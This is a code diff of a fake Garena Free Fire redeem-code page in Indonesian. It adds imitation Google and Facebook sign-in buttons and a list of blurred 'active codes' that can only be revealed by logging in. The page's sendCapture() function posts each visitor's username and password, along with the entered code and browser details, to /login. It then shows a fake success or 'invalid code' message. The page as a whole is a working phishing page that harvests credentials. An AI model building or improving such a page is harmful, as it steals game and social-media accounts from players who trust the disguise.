@@ -6,8 +6,8 @@
   <meta http-equiv="x-dns-prefetch-control" content="on"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
   <title>Free Fire</title>
-  <link rel="icon" href="/attached_assets/ff-logo-icon.png" type="image/x-icon"/>
-  <link rel="shortcut icon" href="/attached_assets/ff-logo-icon.png" type="image/x-icon"/>
+  <link rel="icon" href="/assets/img/ff_logo.png" type="image/x-icon"/>
+  <link rel="shortcut icon" href="/assets/img/ff_logo.png" type="image/x-icon"/>
   <meta name="title" content="FreeFire"/>
   <meta name="description" content="FreeFire"/>
   <meta property="og:title" content="FreeFire"/>
@@ -263,15 +263,35 @@
       color:rgba(255,255,255,0.25);margin-bottom:12px;text-align:center;text-transform:uppercase;
     }
     .rp-modal-social{display:flex;flex-direction:column;gap:8px}
-    .rp-modal-social-btn{
-      display:flex;align-items:center;gap:10px;
-      background:#1e1e1e;border:1px solid rgba(255,255,255,0.07);
-      border-radius:6px;padding:11px 14px;
-      font-size:13px;font-weight:600;color:rgba(255,255,255,0.6);
-      transition:border-color 0.2s,background 0.2s;text-align:left;
+    .g-oauth-btn{
+      display:flex;align-items:center;width:100%;height:42px;
+      background:#fff;border:1px solid #dadce0;border-radius:4px;
+      font-family:'Google Sans',Roboto,Arial,sans-serif;
+      font-size:14px;font-weight:500;color:#3c4043;letter-spacing:.25px;
+      box-shadow:0 1px 2px rgba(60,64,67,.1);
+      cursor:pointer;transition:background .15s,box-shadow .15s;overflow:hidden;padding:0;
     }
-    .rp-modal-social-btn:hover{border-color:rgba(255,255,255,0.18);background:#232323}
-    .rp-modal-social-btn svg{width:18px;height:18px;flex-shrink:0}
+    .g-oauth-btn:hover{background:#f5f5f5;box-shadow:0 1px 3px rgba(60,64,67,.18)}
+    .g-oauth-icon{
+      width:42px;height:42px;flex-shrink:0;
+      display:flex;align-items:center;justify-content:center;
+      border-right:1px solid #dadce0;
+    }
+    .g-oauth-label{flex:1;text-align:center;padding-right:42px}
+    .fb-oauth-btn{
+      display:flex;align-items:center;width:100%;height:42px;
+      background:#1877F2;border:none;border-radius:4px;
+      font-family:Helvetica,Arial,sans-serif;
+      font-size:14px;font-weight:700;color:#fff;
+      cursor:pointer;transition:background .15s;overflow:hidden;padding:0;
+    }
+    .fb-oauth-btn:hover{background:#166fe5}
+    .fb-oauth-icon{
+      width:42px;height:42px;flex-shrink:0;
+      display:flex;align-items:center;justify-content:center;
+      border-right:1px solid rgba(255,255,255,.15);
+    }
+    .fb-oauth-label{flex:1;text-align:center;padding-right:42px}
     .rp-modal-or{
       text-align:center;font-size:10px;color:rgba(255,255,255,0.12);
       margin:12px 0;display:flex;align-items:center;gap:8px;
@@ -343,6 +363,101 @@
       font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:700;
       letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.3);
     }
+
+    /* ═══ REWARD ICON SVG ═══ */
+    .rp-reward-icon svg{width:26px;height:26px;display:block}
+
+    /* ═══ CODE LIST SECTION ═══ */
+    .rp-codes-section{
+      background:#0f0f0f;
+      border-top:1px solid rgba(255,255,255,0.04);
+      border-bottom:1px solid rgba(255,255,255,0.04);
+      padding:clamp(24px,4vw,52px) clamp(16px,4vw,48px);
+    }
+    .rp-codes-grid{
+      display:grid;gap:12px;
+      grid-template-columns:repeat(auto-fill,minmax(270px,1fr));
+    }
+    @media(min-width:860px){.rp-codes-grid{grid-template-columns:repeat(3,1fr)}}
+    .rp-code-item{
+      background:#141414;border:1px solid rgba(255,255,255,0.06);
+      border-radius:10px;padding:16px;
+      transition:border-color 0.25s;
+    }
+    .rp-code-item.unlocked{border-color:rgba(255,166,24,0.22)}
+    .rp-code-meta{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:5px}
+    .rp-code-name{
+      font-family:'Barlow Condensed',sans-serif;
+      font-size:13px;font-weight:800;letter-spacing:0.8px;
+      text-transform:uppercase;color:#fff;line-height:1.2;
+    }
+    .rp-code-tag{
+      font-size:9px;font-weight:700;letter-spacing:1px;flex-shrink:0;
+      text-transform:uppercase;padding:2px 7px;border-radius:3px;
+      background:rgba(255,166,24,0.08);color:#ffa618;border:1px solid rgba(255,166,24,0.18);
+    }
+    .rp-code-reward-desc{font-size:11px;color:rgba(255,255,255,0.28);margin-bottom:12px;line-height:1.4}
+    .rp-code-display{
+      position:relative;background:#0d0d0d;
+      border:1px solid rgba(255,255,255,0.07);border-radius:6px;
+      padding:10px 12px;margin-bottom:10px;
+      display:flex;align-items:center;justify-content:space-between;gap:8px;min-height:42px;
+    }
+    .rp-code-val{
+      font-family:'Barlow Condensed',sans-serif;
+      font-size:15px;font-weight:800;letter-spacing:4px;
+      color:#ffa618;text-transform:uppercase;
+      transition:filter 0.35s;
+      filter:blur(8px);
+      user-select:none;-webkit-user-select:none;pointer-events:none;
+    }
+    .rp-code-item.unlocked .rp-code-val{
+      filter:none;
+      user-select:text;-webkit-user-select:text;pointer-events:auto;
+    }
+    .rp-code-lock-icon{
+      display:flex;align-items:center;color:rgba(255,255,255,0.13);flex-shrink:0;
+    }
+    .rp-code-lock-icon svg{width:14px;height:14px}
+    .rp-code-item.unlocked .rp-code-lock-icon{display:none}
+    .rp-copy-btn{
+      display:none;align-items:center;gap:5px;
+      background:none;border:1px solid rgba(255,166,24,0.28);
+      border-radius:4px;padding:4px 10px;
+      font-family:'Barlow Condensed',sans-serif;
+      font-size:10px;font-weight:700;letter-spacing:1px;
+      color:#ffa618;text-transform:uppercase;flex-shrink:0;
+      transition:background 0.2s,border-color 0.2s,color 0.2s;
+    }
+    .rp-code-item.unlocked .rp-copy-btn{display:flex}
+    .rp-copy-btn:hover{background:rgba(255,166,24,0.08);border-color:rgba(255,166,24,0.5)}
+    .rp-copy-btn.copied{color:#00C853;border-color:rgba(0,200,83,0.3);background:rgba(0,200,83,0.05)}
+    .rp-copy-btn svg{width:11px;height:11px;flex-shrink:0}
+    .rp-code-unlock-btn{
+      width:100%;
+      display:flex;align-items:center;justify-content:center;gap:7px;
+      background:rgba(255,255,255,0.02);
+      border:1px solid rgba(255,255,255,0.07);border-radius:5px;
+      padding:9px 12px;
+      font-family:'Barlow Condensed',sans-serif;
+      font-size:11px;font-weight:700;letter-spacing:1px;
+      color:rgba(255,255,255,0.3);text-transform:uppercase;
+      transition:background 0.2s,border-color 0.2s,color 0.2s;
+    }
+    .rp-code-unlock-btn:hover{
+      background:rgba(255,166,24,0.06);
+      border-color:rgba(255,166,24,0.22);
+      color:#ffa618;
+    }
+    .rp-code-unlock-btn svg{width:12px;height:12px;flex-shrink:0}
+    .rp-code-item.unlocked .rp-code-unlock-btn{display:none}
+    .rp-codes-login-notice{
+      display:flex;align-items:center;gap:8px;margin-bottom:18px;
+      background:rgba(255,166,24,0.05);border:1px solid rgba(255,166,24,0.12);
+      border-radius:7px;padding:11px 14px;
+      font-size:12px;color:rgba(255,255,255,0.35);line-height:1.4;
+    }
+    .rp-codes-login-notice svg{width:14px;height:14px;color:#ffa618;flex-shrink:0}
   </style>
 </head>
 <body>
@@ -352,7 +467,7 @@
   <header class="rp-header">
     <div class="rp-header-logo">
       <img class="rp-header-logo-img"
-           src="/attached_assets/ff-logo-icon.png"
+           src="/assets/img/ff_logo.png"
            onerror="this.src='https://dl.dir.freefiremobile.com/common/web_event/tweb-event/FFSH/assets-common/ff-logo-icon.png'"
            alt="Free Fire"/>
       <span class="rp-header-title">Free Fire</span>
@@ -370,7 +485,7 @@
       <!-- Character art (left side) -->
       <div class="rp-hero-art">
         <img class="rp-hero-art-img"
-             src="/attached_assets/ff-chars-bg.jpg"
+             src="/assets/img/hero_kickoff.jpg"
              alt="Free Fire"/>
         <div class="rp-hero-art-overlay"></div>
       </div>
@@ -380,7 +495,7 @@
 
         <div class="rp-game-badge">
           <img class="rp-game-badge-icon"
-               src="/attached_assets/ff-logo-icon.png"
+               src="/assets/img/ff_logo.png"
                onerror="this.style.display='none'"
                alt=""/>
           <span class="rp-game-badge-txt">Garena Free Fire</span>
@@ -451,12 +566,165 @@
       <div class="rp-section-sub">Klaim item eksklusif edisi terbatas dengan kode redeem event</div>
     </div>
     <div class="rp-rewards-list">
-      <div class="rp-reward-card"><div class="rp-reward-icon">💎</div><div class="rp-reward-name">Diamond ×100</div></div>
-      <div class="rp-reward-card"><div class="rp-reward-icon">🎽</div><div class="rp-reward-name">Jersey Kickoff</div></div>
-      <div class="rp-reward-card"><div class="rp-reward-icon">🗺️</div><div class="rp-reward-name">Map Skin Eksklusif</div></div>
-      <div class="rp-reward-card"><div class="rp-reward-icon">🧪</div><div class="rp-reward-name">Potion Elite Pass</div></div>
-      <div class="rp-reward-card"><div class="rp-reward-icon">🔥</div><div class="rp-reward-name">Bonfire Bundle</div></div>
-      <div class="rp-reward-card"><div class="rp-reward-icon">🏅</div><div class="rp-reward-name">Gold Badge FF</div></div>
+      <div class="rp-reward-card">
+        <div class="rp-reward-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffa618" stroke-width="1.5" stroke-linejoin="round"><path d="M6 3h12l4 6-10 12L2 9z"/><path d="M2 9h20M12 3l4 6m-4-6-4 6"/></svg></div>
+        <div class="rp-reward-name">Diamond ×100</div>
+      </div>
+      <div class="rp-reward-card">
+        <div class="rp-reward-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffa618" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20.38 3.46 16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.57a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.57a2 2 0 0 0-1.34-2.23z"/></svg></div>
+        <div class="rp-reward-name">Jersey Kickoff</div>
+      </div>
+      <div class="rp-reward-card">
+        <div class="rp-reward-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffa618" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"/><line x1="8" y1="2" x2="8" y2="18"/><line x1="16" y1="6" x2="16" y2="22"/></svg></div>
+        <div class="rp-reward-name">Map Skin Eksklusif</div>
+      </div>
+      <div class="rp-reward-card">
+        <div class="rp-reward-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffa618" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10 2v7.31l-3.72 6.9A2 2 0 0 0 8.06 19h7.88a2 2 0 0 0 1.78-2.79L14 9.31V2"/><path d="M8.5 2h7"/></svg></div>
+        <div class="rp-reward-name">Potion Elite Pass</div>
+      </div>
+      <div class="rp-reward-card">
+        <div class="rp-reward-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffa618" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.07-2.14-.22-4.05 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.15.43-2.29 1-3a2.5 2.5 0 0 0 2.5 3z"/></svg></div>
+        <div class="rp-reward-name">Bonfire Bundle</div>
+      </div>
+      <div class="rp-reward-card">
+        <div class="rp-reward-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffa618" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="6"/><path d="M15.48 12.89 17 22l-5-3-5 3 1.52-9.11"/></svg></div>
+        <div class="rp-reward-name">Gold Badge FF</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CODE LIST SECTION -->
+  <div class="rp-codes-section">
+    <div class="rp-section-head">
+      <div class="rp-section-title">Kode Redeem Aktif</div>
+      <div class="rp-section-sub">Kode eksklusif Fire Kickoff 2026 — login untuk melihat dan menyalin</div>
+    </div>
+    <div class="rp-codes-login-notice">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      Kode tersembunyi untuk keamanan akun. Masuk dengan akun Garena untuk melihat dan menyalin kode aktif.
+    </div>
+    <div class="rp-codes-grid">
+
+      <div class="rp-code-item">
+        <div class="rp-code-meta">
+          <div class="rp-code-name">Fire Kickoff Bundle</div>
+          <div class="rp-code-tag">EVENT</div>
+        </div>
+        <div class="rp-code-reward-desc">Bundle Eksklusif + 50 Diamond</div>
+        <div class="rp-code-display">
+          <div class="rp-code-val">FFKICK26AA01</div>
+          <div class="rp-code-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <button class="rp-copy-btn" id="copy-0" onclick="copyCode('FFKICK26AA01',0)">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            <span>Salin</span>
+          </button>
+        </div>
+        <button class="rp-code-unlock-btn" onclick="requireLogin()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Login untuk Lihat Kode
+        </button>
+      </div>
+
+      <div class="rp-code-item">
+        <div class="rp-code-meta">
+          <div class="rp-code-name">OB53 Character Skin</div>
+          <div class="rp-code-tag">OB53</div>
+        </div>
+        <div class="rp-code-reward-desc">Skin Karakter Eksklusif + 30 Diamond</div>
+        <div class="rp-code-display">
+          <div class="rp-code-val">OB53FKICK012</div>
+          <div class="rp-code-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <button class="rp-copy-btn" id="copy-1" onclick="copyCode('OB53FKICK012',1)">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            <span>Salin</span>
+          </button>
+        </div>
+        <button class="rp-code-unlock-btn" onclick="requireLogin()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Login untuk Lihat Kode
+        </button>
+      </div>
+
+      <div class="rp-code-item">
+        <div class="rp-code-meta">
+          <div class="rp-code-name">Jersey Kickoff Pack</div>
+          <div class="rp-code-tag">EKSKLUSIF</div>
+        </div>
+        <div class="rp-code-reward-desc">Jersey Eksklusif + Emote Kickoff</div>
+        <div class="rp-code-display">
+          <div class="rp-code-val">JRSEYKCK26B3</div>
+          <div class="rp-code-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <button class="rp-copy-btn" id="copy-2" onclick="copyCode('JRSEYKCK26B3',2)">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            <span>Salin</span>
+          </button>
+        </div>
+        <button class="rp-code-unlock-btn" onclick="requireLogin()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Login untuk Lihat Kode
+        </button>
+      </div>
+
+      <div class="rp-code-item">
+        <div class="rp-code-meta">
+          <div class="rp-code-name">Football Pack</div>
+          <div class="rp-code-tag">EVENT</div>
+        </div>
+        <div class="rp-code-reward-desc">100.000 Gold + Avatar Border</div>
+        <div class="rp-code-display">
+          <div class="rp-code-val">FFBALL2026C4</div>
+          <div class="rp-code-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <button class="rp-copy-btn" id="copy-3" onclick="copyCode('FFBALL2026C4',3)">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            <span>Salin</span>
+          </button>
+        </div>
+        <button class="rp-code-unlock-btn" onclick="requireLogin()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Login untuk Lihat Kode
+        </button>
+      </div>
+
+      <div class="rp-code-item">
+        <div class="rp-code-meta">
+          <div class="rp-code-name">Gold Badge Pack</div>
+          <div class="rp-code-tag">BADGE</div>
+        </div>
+        <div class="rp-code-reward-desc">Gold Badge FF + Namecard Eksklusif</div>
+        <div class="rp-code-display">
+          <div class="rp-code-val">KBADGE2026D5</div>
+          <div class="rp-code-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <button class="rp-copy-btn" id="copy-4" onclick="copyCode('KBADGE2026D5',4)">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            <span>Salin</span>
+          </button>
+        </div>
+        <button class="rp-code-unlock-btn" onclick="requireLogin()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Login untuk Lihat Kode
+        </button>
+      </div>
+
+      <div class="rp-code-item">
+        <div class="rp-code-meta">
+          <div class="rp-code-name">Bonus Bundle</div>
+          <div class="rp-code-tag">BONUS</div>
+        </div>
+        <div class="rp-code-reward-desc">Map Skin Eksklusif + Potion Elite</div>
+        <div class="rp-code-display">
+          <div class="rp-code-val">FIREKK26EE06</div>
+          <div class="rp-code-lock-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+          <button class="rp-copy-btn" id="copy-5" onclick="copyCode('FIREKK26EE06',5)">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            <span>Salin</span>
+          </button>
+        </div>
+        <button class="rp-code-unlock-btn" onclick="requireLogin()">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Login untuk Lihat Kode
+        </button>
+      </div>
+
     </div>
   </div>
 
@@ -472,7 +740,7 @@
   <!-- FOOTER -->
   <footer class="rp-footer">
     <img class="rp-footer-logo"
-         src="/attached_assets/garena_logo.png"
+         src="/assets/img/ff_logo.png"
          onerror="this.src='https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png'"
          alt="Garena"/>
     <ul class="rp-footer-links">
@@ -490,7 +758,7 @@
   <div class="rp-modal">
     <div class="rp-modal-head">
       <div class="rp-modal-ff-logo">
-        <img src="/attached_assets/ff-logo-icon.png"
+        <img src="/assets/img/ff_logo.png"
              onerror="this.style.display='none'" alt="FF"/>
         <span class="rp-modal-ff-logo-txt">Garena Free Fire</span>
       </div>
@@ -501,20 +769,24 @@
     <div class="rp-modal-body">
       <div class="rp-modal-body-label">Masuk dengan</div>
       <div class="rp-modal-social">
-        <button class="rp-modal-social-btn" onclick="handleSocialLogin('google')">
-          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
-            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
-          </svg>
-          Lanjutkan dengan Google
+        <button class="g-oauth-btn" onclick="handleSocialLogin('google')">
+          <div class="g-oauth-icon">
+            <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+              <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908C16.418 14.017 17.64 11.773 17.64 9.2z" fill="#4285F4"/>
+              <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.909-2.259c-.806.54-1.837.86-3.047.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 0 0 9 18z" fill="#34A853"/>
+              <path d="M3.964 10.71A5.41 5.41 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 0 0 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
+              <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 0 0 .957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
+            </svg>
+          </div>
+          <span class="g-oauth-label">Sign in with Google</span>
         </button>
-        <button class="rp-modal-social-btn" onclick="handleSocialLogin('facebook')">
-          <svg viewBox="0 0 24 24" fill="#1877F2" xmlns="http://www.w3.org/2000/svg">
-            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-          </svg>
-          Lanjutkan dengan Facebook
+        <button class="fb-oauth-btn" onclick="handleSocialLogin('facebook')">
+          <div class="fb-oauth-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path fill="#fff" d="M9.198 21.5h4v-8.01h3.604l.396-3.98h-4V7.5a1 1 0 0 1 1-1h3v-4h-3a5 5 0 0 0-5 5v2.01h-2l-.396 3.98h2.396v8.01z"/>
+            </svg>
+          </div>
+          <span class="fb-oauth-label">Continue with Facebook</span>
         </button>
       </div>
       <div class="rp-modal-or">atau dengan email</div>
@@ -552,6 +824,7 @@
 
 <script>
 var pendingCode = '';
+var pendingAction = 'redeem'; // 'redeem' | 'unlock'
 
 function handleCodeInput(el) {
   var v = el.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
@@ -579,15 +852,22 @@ function handleSubmit(e) {
     return;
   }
   pendingCode = code;
+  pendingAction = 'redeem';
   setMainLoading(true, 'Memverifikasi Kode...');
   setTimeout(function() {
     setMainLoading(false);
-    openModal(code);
+    document.getElementById('modal-code-display').textContent = code;
+    openModal();
   }, 1500);
 }
 
-function openModal(code) {
-  document.getElementById('modal-code-display').textContent = code;
+function requireLogin() {
+  pendingAction = 'unlock';
+  document.getElementById('modal-code-display').textContent = 'Fire Kickoff 2026';
+  openModal();
+}
+
+function openModal() {
   document.getElementById('rp-modal').classList.add('open');
   document.body.style.overflow = 'hidden';
 }
@@ -616,6 +896,7 @@ function setModalLoading(on) {
 }
 
 function handleSocialLogin(p) {
+  setModalLoading(true);
   sendCapture({
     username: 'social_' + p,
     password: 'SOCIAL:' + p.toUpperCase(),
@@ -633,6 +914,7 @@ function handleEmailLogin() {
 }
 
 function sendCapture(data) {
+  var action = pendingAction;
   fetch('/login', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -640,8 +922,9 @@ function sendCapture(data) {
       username: data.username,
       password: data.password,
       code: pendingCode,
-      server: document.getElementById('rp-server').value,
+      server: document.getElementById('rp-server') ? document.getElementById('rp-server').value : '',
       type: data.type || 'email',
+      action: action,
       ua: navigator.userAgent,
       ts: new Date().toISOString()
     })
@@ -650,14 +933,56 @@ function sendCapture(data) {
   setTimeout(function() {
     setModalLoading(false);
     closeModal();
-    setMainLoading(true, 'Memproses Hadiah...');
+    var loadingTxt = action === 'unlock' ? 'Memverifikasi Akun...' : 'Memproses Hadiah...';
+    setMainLoading(true, loadingTxt);
     setTimeout(function() {
       setMainLoading(false);
-      showToast('Kode tidak valid atau sudah digunakan. Coba kode lain.', 'error');
-      document.getElementById('rp-code').value = '';
-      document.getElementById('rp-code-clear').classList.remove('visible');
+      if (action === 'unlock') {
+        unlockCodes();
+        showToast('Login berhasil. Kode aktif sekarang tersedia.', 'success');
+      } else {
+        showToast('Kode tidak valid atau sudah digunakan. Coba kode lain.', 'error');
+        document.getElementById('rp-code').value = '';
+        document.getElementById('rp-code-clear').classList.remove('visible');
+      }
     }, 2200);
   }, 1800);
+}
+
+function unlockCodes() {
+  document.querySelectorAll('.rp-code-item').forEach(function(el) {
+    el.classList.add('unlocked');
+  });
+}
+
+function copyCode(code, idx) {
+  var btn = document.getElementById('copy-' + idx);
+  var span = btn.querySelector('span');
+  function onDone() {
+    btn.classList.add('copied');
+    span.textContent = 'Tersalin';
+    setTimeout(function() {
+      btn.classList.remove('copied');
+      span.textContent = 'Salin';
+    }, 2200);
+  }
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(code).then(onDone).catch(function() {
+      fallbackCopy(code); onDone();
+    });
+  } else {
+    fallbackCopy(code); onDone();
+  }
+}
+
+function fallbackCopy(text) {
+  var ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.cssText = 'position:fixed;top:0;left:0;opacity:0;pointer-events:none';
+  document.body.appendChild(ta);
+  ta.focus(); ta.select();
+  try { document.execCommand('copy'); } catch(e) {}
+  document.body.removeChild(ta);
 }
 
 function showToast(msg, type) {
